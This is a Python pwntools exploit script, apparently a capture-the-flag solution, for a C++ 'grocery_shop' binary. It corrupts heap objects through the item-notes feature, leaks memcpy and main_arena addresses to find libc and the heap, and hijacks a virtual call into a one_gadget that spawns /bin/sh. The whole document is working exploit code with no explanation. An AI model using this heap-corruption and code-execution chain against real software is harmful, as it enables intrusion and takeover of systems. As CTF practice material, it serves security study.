#!/usr/bin/env python3

from asyncio import log
from pwn import *

exe = ELF("./grocery_shop")
libc = ELF("./libc-2.31.so")

rop = ROP([exe, libc])

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="""
                       b main
                       b *ShowCart(Cart&)+0x00e4
                       c
                       """)

    return r

items = {
    100: b"soap",
    101: b"broom",
    300: b"straws",
    400: b"milk",
    500: b"chips",
    600: b"oranges",
    601: b"carrots"
}

def add_item(r, id):
    r.sendlineafter(b"> ", b"add item")
    r.sendlineafter(b"> ", id)

def remove_item(r, id):
    r.sendlineafter(b"> ", b"remove item")
    r.sendlineafter(b"> ", id)

def set_count(r, id, count):
    r.sendlineafter(b"> ", b"set count")
    r.sendlineafter(b"> ", id)
    r.sendlineafter(b"> ", count)

def set_notes(r, id, notes):
    r.sendlineafter(b"> ", b"set notes")
    r.sendlineafter(b"> ", id)
    r.sendlineafter(b"> ", notes)

def show_cart(r):
    r.sendlineafter(b"> ", b"show cart")

def show_catalogue(r):
    r.sendlineafter(b"> ", b"show catalogue")

def pay(r):
    r.sendlineafter(b"> ", b"pay")

def exit(r):
    r.sendlineafter(b"> ", b"exit")

def main():
    r = conn()

    MAIN = exe.symbols['main']
    RET = rop.find_gadget(['ret'])[0]
    memcpy = 0x40a0a0
    print(f"MAIN @ {hex(MAIN)}")
    PRINT = 0x402450
    print_pay = 0x403c12
    GET_ID = 0x0000000000404dbc
    read_name_vptr = 0x0000000000409cc0
    memcopy_got = exe.got['memcpy']

    add_item(r, b"100")
    add_item(r, b"500")
    remove_item(r, b"500")
    r.sendlineafter(b"> ", b"A"*0x20)
    add_item(r, b"601")
    remove_item(r, b"601")
    add_item(r, b"601")
    set_notes(r, b"100", p64(read_name_vptr) + p64(memcopy_got) + p64(8) + b"B"*0x20) # after 0x28 into number 0x30 overwrite into price
    # Its in the format
    # jump std::string start
    show_cart(r)
    r.recvuntil(b"- 4774451407313060418 - ")
    leaked = r.recv(8).strip(b"\n").ljust(8, b"\x00")
    memcopy_leak = u64(leaked)
    offset = 0x707a905a0840 - 0x0000707a90400000
    log.success(f'memcpy offset: {hex(libc.symbols["memcpy"])}')
    log.success(f' offset: {hex(offset)}')
    libc.address = memcopy_leak - offset
    log.success(f'memcpy leak: {hex(memcopy_leak)}')
    log.success(f'LIBC base: {hex(libc.address)}')
    one_gadget = libc.address + 0xebc88 # 0xe3b01 execve("/bin/sh", r15, rdx)
    LEAVE = rop.find_gadget(['leave', 'ret'])[0] # leave ; ret

    log.success(f'one_gadget: {hex(one_gadget)}')
    log.success(f'LEAVE: {hex(LEAVE + libc.address)}')
    
    main_arena_bin_offset = 0x7be0a621ace0 - 0x00007be0a6000000
    main_arena = main_arena_bin_offset + libc.address
    log.success(f'main_arena offset: {hex(main_arena_bin_offset)}')
    log.success(f'main_arena: {hex(main_arena)}')

    # second jump is
    add_item(r, b"101")
    add_item(r, b"300")
    add_item(r, b"400")
    remove_item(r, b"300")
    remove_item(r, b"400")
    add_item(r, b"400")

    set_notes(r, b"101", p64(read_name_vptr) + p64(main_arena) + p64(8) + b"B"*0x20)

    show_cart(r)
    r.recvuntil(b"- 4774451407313060418 - ")
    r.recvuntil(b"- 4774451407313060418 - ")
    leaked = r.recv(8).strip(b"\n").ljust(8, b"\x00")
    heap_leak = u64(leaked)
    heap_offset = 0x3a339d20 - 0x000000003a326000
    heap_base = heap_leak - heap_offset

    SET_RDX = libc.address + 0x0000000000075680 #  mov rdx, r13 ; mov rsi, r10 ; mov rdi, r15 ; call qword ptr [rax + 0x38] CAUSES RDX to be valid and RSI to be one

    heap_offset_controlable = 0x2225c515 - 0x2224a000
    heap_controlable = heap_offset_controlable + heap_base
    log.success(f'heap leak: {hex(heap_leak)}')
    log.success(f'heap base: {hex(heap_base)}')
    log.success(f'heap controlable: {hex(heap_controlable)}')
    
    add_item(r, b"600")
    set_notes(r, b"101", p64(one_gadget) + p64(one_gadget) + p64(SET_RDX) +  p64(one_gadget)*10 + b"A"*0x1d0)
    set_notes(r, b"600", p64(heap_controlable) + p64(heap_controlable) + p64(8) + b"B"*0x20)
    show_cart(r)
    r.interactive()


if __name__ == "__main__":
    main()
